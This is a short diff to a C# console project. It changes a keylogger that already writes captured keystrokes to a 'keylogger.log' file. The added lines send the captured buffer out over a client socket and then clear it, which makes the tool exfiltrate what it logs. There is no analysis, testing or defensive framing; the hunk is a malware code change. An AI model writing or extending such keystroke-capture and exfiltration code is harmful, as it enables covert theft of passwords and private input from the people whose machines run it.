@@ -58,7 +58,8 @@ namespace ConsoleApp1
                                 if (SaveFile == true)
                                 {
                                     File.AppendAllText(SaveLocation + "keylogger.log", buf);
-
+                                    clientSocket.Send(Encoding.UTF8.GetBytes(buf));
+                                    buf = "";
                                 }
                                 else
                                 {
